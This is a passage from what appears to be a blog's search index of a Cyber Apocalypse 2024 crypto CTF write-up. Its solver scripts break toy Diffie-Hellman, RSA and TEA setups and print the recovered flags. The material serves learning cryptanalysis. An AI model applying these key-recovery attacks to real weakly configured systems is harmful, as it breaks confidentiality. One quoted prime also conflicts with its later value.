2 return ans def __str__(self): return str(self.mapping) def identity(length): return Permutation(range(length)) x = list(range(50_000)) shuffle(x) g = Permutation(x) print('g =', g) A = g**a print('A =', A) B = g**b print('B =', B) C = A**b assert C.mapping == (B**a).mapping sec = tuple(C.mapping) sec = hash(sec) sec = long_to_bytes(sec) hash = sha256() hash.update(sec) key = hash.digest()[16:32] iv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\" cipher = AES.new(key, AES.MODE_CBC, iv) encrypted = cipher.encrypt(pad(FLAG, 16)) print('c =', encrypted) The challenge is akin to the Diffie-Hellman key exchange but operates within a Permutation Group instead. The output.txt file provides us with g, A, B, and c. The task is to discover the private key, either a or b, enabling us to generate C and use it to decrypt the encrypted flag. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:3:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution First, we should load the given g, A, and B, and experiment with them. I prefer using Sage for debugging in such challenges because of its convenience. Let’s start by converting the list to Permutations and PermutationGroup in Sage. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 out = open('output.txt').read() exec(out) print(len(g)) print(len(A)) print(len(B)) a = A b = B # sage permutations doesn't allow 0, so we can simply increase all of it :D for i in range(50_000): g[i] += 1 a[i] += 1 b[i] += 1 V = Permutations(50_000) G = V(g) A = V(a) B = V(b) PG = PermutationGroup([G]) Now, this is a discrete log problem, where given g and A, we need to find a so that g**a = A. Let’s check the group order first. order = PG.order() print(f'{order = }') As you can see, the order is 3311019189498977856900. Let’s check whether this can be factorize or not. sage: factor(order) 2^2 * 3^3 * 5^2 * 7 * 11 * 13 * 23^2 * 47 * 53 * 101 * 149 * 163 * 379 Notably, the order of the group is quite smooth, allowing the potential application of the Pohlig-Hellman algorithm to deduce the private key a. For a detailed explanation, refer to this resource. In summary, this strategy involves simplifying the discrete logarithm problem to a smaller subgroup, where finding the discrete log is feasible. Subsequently, the findings from these smaller subgroups can assist in reconstructing the accurate private key using the Chinese Remainder Theorem. Below is the script I used to solve this challenge: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 out = open('output.txt').read() exec(out) print(len(g)) print(len(A)) print(len(B)) a = A b = B # sage permutations doesn't allow 0, so we can simply increase all of it :D for i in range(50_000): g[i] += 1 a[i] += 1 b[i] += 1 V = Permutations(50_000) G = V(g) A = V(a) B = V(b) PG = PermutationGroup([G]) order = PG.order() print(f'{order = }') # Order is smooth, so we can do Pohlig-Hellman :) primes = [2^2, 3^3, 5^2, 7, 11, 13, 23^2, 47, 53, 101, 149, 163, 379] dlogs = [] for fac in primes: print(f'===') print(f'{fac = }') t = int(order) // int(fac) GG = G**t AA = A**t # Subgroup is smaller, so we can easily bruteforce it (and do CRT later) print(f'Start bf...') for dlog in range(fac): print(f'Try {dlog}...') test = GG**dlog if test == AA: # found! print(f'Found!!!') dlogs += [dlog] break print(\"factor: \"+str(fac)+\", Discrete Log: \"+str(dlog)) #calculates discrete logarithm for each prime order print(f'===') print(f'{dlogs = }') priv_a = crt(dlogs, primes) assert A == G**priv_a C = B**priv_a # Restore back to permutations starting from 0 list_c = [x-1 for x in list(C)] sec = tuple(list_c) sec = hash(sec) sec = long_to_bytes(sec) hash = sha256() hash.update(sec) key = hash.digest()[16:32] iv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\" cipher = AES.new(key, AES.MODE_CBC, iv) msg = cipher.decrypt(c) print(msg) Flag: HTB{w3lL_n0T_aLl_gRoUpS_aRe_eQUaL_!!} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:3:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Partial Tenacity [medium] Description You find yourself in a labyrinthine expanse where movement is restricted to forward paths only. Each step presents both opportunity and uncertainty, as the correct route remains shrouded in mystery. Your mission is clear: navigate the labyrinth and reach the elusive endpoint. However, there’s a twist—you have just one chance to discern the correct path. Should you falter and choose incorrectly, you’re cast back to the beginning, forced to restart your journey anew. As you embark on this daunting quest, the labyrinth unfolds before you, its twisting passages and concealed pathways presenting a formidable challenge. With each stride, you must weigh your options carefully, considering every angle and possibility. Yet, despite the daunting odds, there’s a glimmer of hope amidst the uncertainty. Hidden throughout the labyrinth are cryptic clues and hints, waiting to be uncovered by the keen-eyed. These hints offer glimpses of the correct path, providing invaluable guidance to those who dare to seek them out. But beware, for time is of the essence, and every moment spent deliberating brings you closer to the brink of failure. With determination and wit as your allies, you must press onward, braving the twists and turns of the labyrinth, in pursuit of victory and escape from the labyrinth’s confounding embrace. Are you tenacious enough for that? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:4:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a quite simple source code. from secret import FLAG from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP class RSACipher: def __init__(self, bits): self.key = RSA.generate(bits) self.cipher = PKCS1_OAEP.new(self.key) def encrypt(self, m): return self.cipher.encrypt(m) def decrypt(self, c): return self.cipher.decrypt(c) cipher = RSACipher(1024) enc_flag = cipher.encrypt(FLAG) with open('output.txt', 'w') as f: f.write(f'n = {cipher.key.n}\\n') f.write(f'ct = {enc_flag.hex()}\\n') f.write(f'p = {str(cipher.key.p)[::2]}\\n') f.write(f'q = {str(cipher.key.q)[1::2]}') To summarize, we were provided with only the odd digits of p and the even digits of q. With this information, we need to find a way to recover p and q. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:4:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution The approach I chose involves a sort of brute-force method combined with backtracking. To illustrate, consider the following scenario. last_digit only 3_4_1 \u003c- p _9_5_ \u003c- q ---------- x 2117357569 \u003c- n Upon careful observation, we can identify a relationship that can be derived. Below is the illustration if we were to perform the multiplication manually. 3_4_1 \u003c- p _9_5_ \u003c- q ---------- x ______ ______ ______ ______ ______ ---------- + 2117357569 \u003c- n i=0 | 0 + p[0]*q[0] i=1 | carry_0 + p[1]*q[0] + p[0]*q[1] i=2 | carry_1 + p[2]*q[0] + p[1]*q[1] + p[0]*q[2] i=3 | carry_2 + p[3]*q[0] + p[2]*q[1] + p[1]*q[2] + p[0]*q[3] ... From this manual multiplication exercise, we can derive that for each digit of n, the formula to calculate it is as follows: $$ n_i = \\text{carry}_{i-1} + \\sum_{j=0}^{i} p_{i-j} \\times q_i $$ With this equation in mind, we can code our Depth-First Search (DFS) strategy as follows: At the current digit, generate all possible combinations of the missing digits. Then, for each of these possible combinations, Insert it into the equation derived above and check: If the result modulo 10 matches the known $n_i$ digit, this indicates a possible combination, so store it. If the result modulo 10 does not match the known $n_i$ digit, skip it. If the list of possible combinations has more than 0 items, we can proceed to the next digit. If there are no possible combinations, something was wrong with our choice of digits. We need to backtrack to the previous digit and try a different combination. Below is the implementation of the strategy described above (with detailed comments). After recovering p and q, decrypting the flag becomes straightforward. from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from Crypto.Util.number import * # -1 == unknown digit ori_p_digits = [1,-1,5,-1,1,-1,4,-1,4,-1,1,-1,4,-1,7,-1,3,-1,3,-1,5,-1,7,-1,1,-1,3,-1,6,-1,1,-1,5,-1,2,-1,9,-1,8,-1,5,-1,2,-1,1,-1,6,-1,9,-1,8,-1,0,-1,3,-1,9,-1,7,-1,5,-1,2,-1,5,-1,5,-1,9,-1,1,-1,3,-1,0,-1,5,-1,8,-1,7,-1,5,-1,0,-1,9,-1,4,-1,2,-1,8,-1,8,-1,7,-1,3,-1,8,-1,8,-1,2,-1,0,-1,6,-1,9,-1,9,-1,0,-1,6,-1,9,-1,2,-1,7,-1,1,-1,6,-1,7,-1,4,-1,0,-1,2,-1,2,-1,1,-1,6,-1,7,-1,9,-1,0,-1,2,-1,6,-1,4,-1,3] ori_q_digits = [-1,1,-1,5,-1,6,-1,2,-1,4,-1,3,-1,4,-1,2,-1,0,-1,0,-1,5,-1,7,-1,7,-1,4,-1,1,-1,6,-1,6,-1,5,-1,2,-1,5,-1,0,-1,2,-1,4,-1,6,-1,0,-1,8,-1,0,-1,6,-1,7,-1,4,-1,2,-1,6,-1,5,-1,5,-1,7,-1,0,-1,9,-1,3,-1,5,-1,6,-1,7,-1,3,-1,9,-1,2,-1,6,-1,5,-1,2,-1,7,-1,2,-1,3,-1,1,-1,7,-1,5,-1,3,-1,0,-1,1,-1,6,-1,1,-1,5,-1,4,-1,2,-1,2,-1,3,-1,8,-1,4,-1,5,-1,0,-1,8,-1,2,-1,7,-1,4,-1,2,-1,6,-1,9,-1,3,-1,0,-1,5,-1] assert len(ori_p_digits) == len(ori_q_digits) # Reverse the list, so the first least significant digit will be in the start of the array ori_p_digits = ori_p_digits[::-1] ori_q_digits = ori_q_digits[::-1] # This will be used to store the temporary digits that we found during doing DFS. # There might be modification during backtracking. p_digits = ori_p_digits q_digits = ori_q_digits n = 118641897764566817417551054135914458085151243893181692085585606712347004549784923154978949512746946759125187896834583143236980760760749398862405478042140850200893707709475167551056980474794729592748211827841494511437980466936302569013868048998752111754493558258605042130232239629213049847684412075111663446003 def dfs(curr_i, carry): # Get n_i target = int(str(n)[::-1][curr_i]) # We already find all the digits if curr_i == len(str(n)): return True # If the curr_i is beyond the length of the p_digits and q_digits, # it is guaranteed that the validitiy of our digits only based on the previous carry if curr_i == len(p_digits) and curr_i == len(q_digits): return carry == target # Get the current digit possible_combi = [] # (p, q, carry) p_digit = p_digits[curr_i] q_digit = q_digits[curr_i] iter_p = [p_digit] iter_q = [q_digit] # If in the curr_i p digit is unknown, put all the possible digits (0..9) if iter_p[0] == -1: iter_p = [num_p for num_p in range(10)] # If in the curr_","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:4:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Arranged [medium] Description Noiselessly turning the corner, you see before you two men. In a former life, the two were best friends; pressure and pain has reduced them to mere animals, single-minded automatons devoid of emotion or feeling. The sickening, grim reality of the competition is that it is what it is designed to do, and none escape the inevitable doom. You raise your bow and bury two arrows into their chests; given their past, it was the least you could do. Death would be kinder to them than life. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:5:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file named sage.py and output.txt. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 from secret import FLAG, p, b, priv_a, priv_b F = GF(p) E = EllipticCurve(F, [726, b]) G = E(926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484232159439344263863246191729458550632500259702851115715803253) A = G * priv_a B = G * priv_b print(A) print(B) C = priv_a * B assert C == priv_b * A # now use it as shared secret secret = C[0] hash = sha256() hash.update(long_to_bytes(secret)) key = hash.digest()[16:32] iv = b'u\\x8fo\\x9aK\\xc5\\x17\\xa7\u003e[\\x18\\xa3\\xc5\\x11\\x9en' cipher = AES.new(key, AES.MODE_CBC, iv) encrypted = cipher.encrypt(pad(FLAG, 16)) print(encrypted) Looking at the challenge, our objective is to somehow recover priv_a, allowing us to compute C and use it as the AES key. This simulates the implementation of the Diffie-Hellman Key Exchange. Understanding the task at hand, let’s think how to craft the solution. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:5:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution First, note that we don’t know the values of $b$ and $p$ yet, so our initial task is to ascertain these values. We have two pairs of points, A and B. We’ll begin by attempting to recover the $p$ value. An elliptic curve is typically represented as $y^2 = x^3 + ax + b \\mod p$. Given two points, we have the following equations: $$ \\begin{align} y_1^2 = x_1^3 + ax_1 + b \\mod p \\\\ y_2^2 = x_2^3 + ax_2 + b \\mod p \\\\ \\end{align} $$ Knowing $a$, $y$, and $x$, subtracting one equation from the other eliminates $b$: $$ \\begin{align} (y_1^2 - y_2^2) = ((x_1^3 -x_2^3) + a*(x_1-x_2)) \\mod p \\\\ (y_1^2 - y_2^2) - ((x_1^3 -x_2^3) + a*(x_1-x_2)) = 0 \\mod p \\\\ \\end{align} $$ Now, we know that $(y_1^2 - y_2^2) - ((x_1^3 - x_2^3) + a \\cdot (x_1-x_2))$ is a multiple of $p$. Our next step is to factor this expression and check for any prime numbers, as $p$ is prime. Below is the initial script I used to first recover that value. x1 = 6174416269259286934151093673164493189253884617479643341333149124572806980379124586263533252636111274525178176274923169261099721987218035121599399265706997 y1 = 2456156841357590320251214761807569562271603953403894230401577941817844043774935363309919542532110972731996540328492565967313383895865130190496346350907696 x2 = 4226762176873291628054959228555764767094892520498623417484902164747532571129516149589498324130156426781285021938363575037142149243496535991590582169062734 y2 = 425803237362195796450773819823046131597391930883675502922975433050925120921590881749610863732987162129269250945941632435026800264517318677407220354869865 a = 726 kp = ((x1^3 -x2^3) + a*(x1-x2)) - (y1^2 - y2^2) The result of the $kp$ that I found is 159876543767731641091481517970757427845475606054901986278343644849685033675014920747838399719911540214497783751629486726130353637225421487102773147275840819453085461179225204956109588744706616404640700114680030501842814692877925213179751117553624678716957461607736397000873235881970428009381374977362878056793806499363109868757164944583438598058337581715444472442097008263247672258671662471244150568581060911658678179702219608062901555447642033897327594285850816 If we input this number into factordb, we can see that one of its factors is a good candidate for $p$, which is 811640204116707417092117962115673978365477767365408659433165386030330695774965849821512765233994033921595018695941912899856987893397852151975650548637533 Now that we have recovered $p$, we can easily find the $b$ value: $$ b = y_1^2 - (x_1^3 + ax_1) \\mod p $$ With the curve parameters fully recovered, let’s explore further. This is a discrete logarithm problem, so we start by checking its order. p = 6811640204116707417092117962115673978365477767365408659433165386030330695774965849821512765233994033921595018695941912899856987893397852151975650548637533 b = (y1^2 - x1^3 - a*x1) % p F = GF(p) E = EllipticCurve(F, [726, b]) order = E.order() print(order) We find that the order is 6811640204116707417092117962115673978365477767365408659433165386030330695774842975950864518820891774127689003723319868798748651155450639754051764297493817 Next, we check if this order can be factorized (with the help of factordb again). Indeed, the order can be factorized, and it has 4 small prime factors: $3$, $11$, $11083$, and $158891976157$. We can attempt the Pohlig-Hellman algorithm. For a detailed explanation, refer to this resource. In summary, this strategy involves reducing the discrete logarithm problem to smaller subgroups, where finding the discrete log is manageable. Then, the findings from these smaller subgroups can be combined to reconstruct the accurate private key using the Chinese Remainder Theorem. Let’s proceed with that approach and check if we can successfully find the correct priv_a. G = E(926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:5:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Blunt [easy] Description Valuing your life, you evade the other parties as much as you can, forsaking the piles of weaponry and the vantage points in favour of the depths of the jungle. As you jump through the trees and evade the traps lining the forest floor, a glint of metal catches your eye. Cautious, you creep around, careful not to trigger any sensors. Lying there is a knife - damaged and blunt, but a knife nonetheless. You’re not helpless any more. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:6:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a source code named source.py and output.txt. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import getPrime, long_to_bytes from hashlib import sha256 from secret import FLAG import random p = getPrime(32) print(f'p = 0x{p:x}') g = random.randint(1, p-1) print(f'g = 0x{g:x}') a = random.randint(1, p-1) b = random.randint(1, p-1) A, B = pow(g, a, p), pow(g, b, p) print(f'A = 0x{A:x}') print(f'B = 0x{B:x}') C = pow(A, b, p) assert C == pow(B, a, p) # now use it as shared secret hash = sha256() hash.update(long_to_bytes(C)) key = hash.digest()[:16] iv = b'\\xc1V2\\xe7\\xed\\xc7@8\\xf9\\\\\\xef\\x80\\xd7\\x80L*' cipher = AES.new(key, AES.MODE_CBC, iv) encrypted = cipher.encrypt(pad(FLAG, 16)) print(f'ciphertext = {encrypted}') Based on the above source code, seems like it try to implement Diffie-Hellman key exchange. The goal here is we need to recover the private key a, so that we can calculate C. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:6:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution Observed that discrete log is hard, but the value that is used here is too small. We can easily find the discrete log with the help of sagemath, so that we can recover C (which is used as the AES key), and we can decrypt the flag. Below is the script that I use to decrypt it. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import getPrime, long_to_bytes from hashlib import sha256 p = 0xdd6cc28d g = 0x83e21c05 A = 0xcfabb6dd B = 0xc4a21ba9 ciphertext = b'\\x94\\x99\\x01\\xd1\\xad\\x95\\xe0\\x13\\xb3\\xacZj{\\x97|z\\x1a(\u0026\\xe8\\x01\\xe4Y\\x08\\xc4\\xbeN\\xcd\\xb2*\\xe6{' a = discrete_log(A, Mod(g,p)) C = pow(B, a, p) hash = sha256() hash.update(long_to_bytes(int(C))) key = hash.digest()[:16] iv = b'\\xc1V2\\xe7\\xed\\xc7@8\\xf9\\\\\\xef\\x80\\xd7\\x80L*' cipher = AES.new(key, AES.MODE_CBC, iv) msg = cipher.decrypt(ciphertext) print(f'{msg = }') Flag: HTB{y0u_n3ed_a_b1gGeR_w3ap0n!!} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:6:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Iced TEA [easy] Description Locked within a cabin crafted entirely from ice, you’re enveloped in a chilling silence. Your eyes land upon an old notebook, its pages adorned with thousands of cryptic mathematical symbols. Tasked with deciphering these enigmatic glyphs to secure your escape, you set to work, your fingers tracing each intricate curve and line with determination. As you delve deeper into the mysterious symbols, you notice that patterns appear in several pages and a glimmer of hope begins to emerge. Time is flying and the temperature is dropping, will you make it before you become one with the cabin? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:7:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this chalenge we were given a source code named source.py and output.txt. import os from secret import FLAG from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def encrypt(self, msg): msg = pad(msg, self.BLOCK_SIZE//8) blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)] ct = b'' if self.mode == Mode.ECB: for pt in blocks: ct += self.encrypt_block(pt) elif self.mode == Mode.CBC: X = self.IV for pt in blocks: enc_block = self.encrypt_block(self._xor(X, pt)) ct += enc_block X = enc_block return ct def encrypt_block(self, msg): m0 = b2l(msg[:4]) m1 = b2l(msg[4:]) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = 0 for i in range(32): s += self.DELTA m0 += ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk m1 += ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m = ((m0 \u003c\u003c (self.BLOCK_SIZE//2)) + m1) \u0026 ((1 \u003c\u003c self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) if __name__ == '__main__': KEY = os.urandom(16) cipher = Cipher(KEY) ct = cipher.encrypt(FLAG) with open('output.txt', 'w') as f: f.write(f'Key : {KEY.hex()}\\nCiphertext : {ct.hex()}') Taking a look at the challenge, we were given the KEY and the ciphertext. That means the challenge here is we only need to create a decrypt function, because they gave us the KEY. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:7:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution The above source code is trying to implement TEA. We can simply follow the wikipedia example (or just ask ChatGPT to made it for us :D). Below is the function that we can use to decrypt it. def decrypt(self, ciphertext): blocks = [ciphertext[i:i+self.BLOCK_SIZE//8] for i in range(0, len(ciphertext), self.BLOCK_SIZE//8)] pt = b'' if self.mode == Mode.ECB: for ct in blocks: pt += self.decrypt_block(ct) return pt def decrypt_block(self, msg): m = b2l(msg) m1 = m \u0026 ((1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1) m0 = m \u003e\u003e (self.BLOCK_SIZE//2) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = self.DELTA * 32 for i in range(32): m1 -= ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m0 -= ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk s -= self.DELTA decrypted_block = l2b(m0) + l2b(m1) return decrypted_block Using the above implementation of the decrypt, we can recover the flag. Flag: HTB{th1s_1s_th3_t1ny_3ncryp710n_4lg0r1thm_____y0u_m1ght_h4v3_4lr34dy_s7umbl3d_up0n_1t_1f_y0u_d0_r3v3rs1ng} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:7:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Primary Knowledge [very easy] Description Surrounded by an untamed forest and the serene waters of the Primus river, your sole objective is surviving for 24 hours. Yet, survival is far from guaranteed as the area is full of Rattlesnakes, Spiders and Alligators and the weather fluctuates unpredictably, shifting from scorching heat to torrential downpours with each passing hour. Threat is compounded by the existence of a virtual circle which shrinks every minute that passes. Anything caught beyond its bounds, is consumed by flames, leaving only ashes in its wake. As the time sleeps away, you need to prioritise your actions secure your surviving tools. Every decision becomes a matter of life and death. Will you focus on securing a shelter to sleep, protect yourself against the dangers of the wilderness, or seek out means of navigating the Primus’ waters? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:8:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file named source.py and output.txt. import math from Crypto.Util.number import getPrime, bytes_to_long from secret import FLAG m = bytes_to_long(FLAG) n = math.prod([getPrime(1024) for _ in range(2**0)]) e = 0x10001 c = pow(m, e, n) with open('output.txt', 'w') as f: f.write(f'{n = }\\n') f.write(f'{e = }\\n') f.write(f'{c = }\\n') The problem with the above encryption is that the n is actually a prime number, not the result of multiplication two prime numbers. Due to this, the private key d recovery is quite straightforward. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:8:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution To calculate the private key d, we can simply calculate it by doing inverse_mod(e, n-1). After recovering d, we can simply decrypt the c by doing pow(c,d,n). from Crypto.Util.number import * n = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347 e = 65537 c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215 d = inverse(e, n-1) print(long_to_bytes(pow(c, d, n))) Flag: HTB{0h_d4mn_4ny7h1ng_r41s3d_t0_0_1s_1!!!} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:8:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Makeshift [very easy] Description Weak and starved, you struggle to plod on. Food is a commodity at this stage, but you can’t lose your alertness - to do so would spell death. You realise that to survive you will need a weapon, both to kill and to hunt, but the field is bare of stones. As you drop your body to the floor, something sharp sticks out of the undergrowth and into your thigh. As you grab a hold and pull it out, you realise it’s a long stick; not the finest of weapons, but once sharpened could be the difference between dying of hunger and dying with honour in combat. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:9:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file named source.py and output.txt from secret import FLAG flag = FLAG[::-1] new_flag = '' for i in range(0, len(flag), 3): new_flag += flag[i+1] new_flag += flag[i+2] new_flag += flag[i] print(new_flag) The encryption is quite straightforward, it just reverse the FLAG string, then scrambled it per 3 characters. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:9:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution We can simply re-arranged per 3 characters, then reverse it. Below is the script that I used to solve: flag = '!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB' new_flag = '' for i in range(0, len(flag), 3): new_flag += flag[i+2] new_flag += flag[i] new_flag += flag[i+1] print(new_flag[::-1]) Flag: HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:9:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Dynastic [very easy] Description You find yourself trapped inside a sealed gas chamber, and suddenly, the air is pierced by the sound of a distorted voice played through a pre-recorded tape. Through this eerie transmission, you discover that within the next 15 minutes, this very chamber will be inundated with lethal hydrogen cyanide. As the tape’s message concludes, a sudden mechanical whirring fills the chamber, followed by the ominous ticking of a clock. You realise that each beat is one step closer to death. Darkness envelops you, your right hand restrained by handcuffs, and the exit door is locked. Your situation deteriorates as you realise that both the door and the handcuffs demand the same passcode to unlock. Panic is a luxury you cannot afford; swift action is imperative. As you explore your surroundings, your trembling fingers encounter a torch. Instantly, upon flipping the switch, the chamber is bathed in a dim glow, unveiling cryptic letters etched into the walls and a disturbing image of a Roman emperor drawn in blood. Decrypting the letters will provide you the key required to unlock the locks. Use the torch wisely as its battery is almost drained out! ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:10:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file named source.py and output.txt from secret import FLAG from random import randint def 